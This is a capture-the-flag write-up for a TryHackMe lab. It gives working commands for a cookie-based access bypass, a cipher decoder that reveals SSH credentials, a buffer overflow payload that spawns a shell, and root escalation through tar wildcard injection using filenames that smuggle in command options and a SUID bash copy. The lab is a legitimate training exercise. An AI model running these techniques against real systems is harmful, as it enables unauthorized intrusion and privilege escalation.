# [Anonymous Playground](https://tryhackme.com/room/anonymousplayground)

## Want to become part of Anonymous? They have a challenge for you. Can you get the flags and become an operative?

# Prove Yourself

## Also credit goes to Sq00ky for the super special idea found in the initial foothold stage (not going to give any spoilers away!)

### User 1 Flag

_You're going to want to write a Python script for this. 'zA' = 'a'_

1. Begin with an nmap scan to identify open ports and running services on the target machine.

```bash
namp <TARGET_IP>
```

[SCREEN01]

The scan reveals an SSH service on port 22 and a web server running on port 80.

2. Use gobuster to discover hidden directories and files on the web server.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x txt
```

[SCREEN03]

3. The `/robots.txt` file contains a disallowed directory path.

```
User-agent: *
Disallow: /zYdHuAKjP
```

4. Navigating to `/zYdHuAKjP` displays an `Access denied` message. Inspect the page source and browser cookies to identify access control mechanisms.

5. The page uses a cookie named `access` with the value `denied`. Modify this cookie value from `denied` to `granted` using browser developer tools (F12). After changing the cookie, refresh the page. This bypasses the access control and reveals an encoded string.

[SCREEN02]

6. **Cipher Decoding** - The page displays an encoded credential string: `hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN`. Based on the hint ('zA' = 'a'), this uses a custom substitution cipher where lowercase letters followed by uppercase letters represent encoded characters. The uppercase letter indicates the offset to apply.

Create a Python script to decode the cipher:

```python
def decode_cipher(text):
    out = []
    i = 0
    while i < len(text):
        if i + 1 < len(text) and text[i].islower() and text[i+1].isupper():
            offset = ord(text[i+1]) - ord('A') + 1
            decoded = chr((ord(text[i]) - ord('a') + offset) % 26 + ord('a'))
            out.append(decoded)
            i += 2
        else:
            out.append(text[i])
            i += 1
    return ''.join(out)

cipher = "hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN"
print(decode_cipher(cipher))
```

Running this script reveals the credentials: `magna::magnaisanelephant`.

7. Use the decoded credentials to SSH into the target machine and retrieve the first user flag.

```bash
ssh magna@<TARGET_IP>
# Enter password: magnaisanelephant
cat flag.txt
```

[SCREEN04]

---

### User 2 Flag

1. After gaining access as magna, explore the home directory. The file `note_from_spooky.txt` provides important context.

```
Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
```

This indicates there's a vulnerable binary in the current directory that can be exploited using buffer overflow techniques.

2. Test the `hacktheworld` binary for buffer overflow vulnerabilities by sending increasingly large inputs. The binary crashes at 72 characters, indicating the buffer overflow point.

```bash
(python -c 'print "A"*72') | ./hacktheworld
```

[SCREEN06]

3. Use radare2 to reverse engineer the binary and identify useful functions.

```bash
r2 -d ./hacktheworld
aaaa              # Analyze all
afl               # List all functions
pdf@asm.call_bash # Disassemble the call_bash function
```

[SCREEN05]

The analysis reveals a `call_bash` function at address `0x00400656`. However, the first instruction is a `push` that we want to skip, so we target `0x00400658` instead to jump directly to the shell spawning code.

4. Craft a buffer overflow exploit that overwrites the return address with the address of the shell code.

```bash
(python -c 'print "A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00"'; cat) | ./hacktheworld
```

The payload consists of:

- 72 'A' characters to fill the buffer
- `\x58\x06\x40\x00\x00\x00\x00\x00` - the address 0x00400658 in little-endian format (8 bytes for 64-bit)
- `cat` keeps stdin open so we can interact with the spawned shell

5. Once the shell is spawned, verify the current user and navigate to spooky's home directory.

```bash
whaomi
# Output: spooky
cd /home/spooky
cat flag.txt
```

[SCREEN07]

---

### Root Flag

1. Upgrade the basic shell to a fully interactive PTY shell for better usability.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

2. Check for scheduled tasks that might be exploitable for privilege escalation

```bash
cat /etc/crontab
```

[SCREEN08]

The crontab reveals a cronjob running as root that executes a tar command in `/home/spooky`. This is vulnerable to tar wildcard injection.

3. Create a shell script that will copy bash to spooky's home directory and set the SUID bit, allowing us to run bash with root privileges.

```bash
echo -e '#!/bin/bash \ncp /bin/bash /home/spooky\nchmod +s /home/spooky/bash' > shell.sh
```

4. Create specially named files that tar will interpret as command-line arguments.

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

When tar runs with a wildcard, it will interpret these filenames as:

- `--checkpoint=1` - Create a checkpoint every 1 file
- `--checkpoint-action=exec=sh shell.sh` - Execute our script at each checkpoint

The `--` prevents the touch command from interpreting the filenames as options.

5.  Wait for the cron job to execute, then run the SUID bash binary with the `-p` flag to preserve privileges.

```bash
/home/spooky/bash -p
whoami
# Output: root
cat /root/flag.txt
```

[SCREEN09]
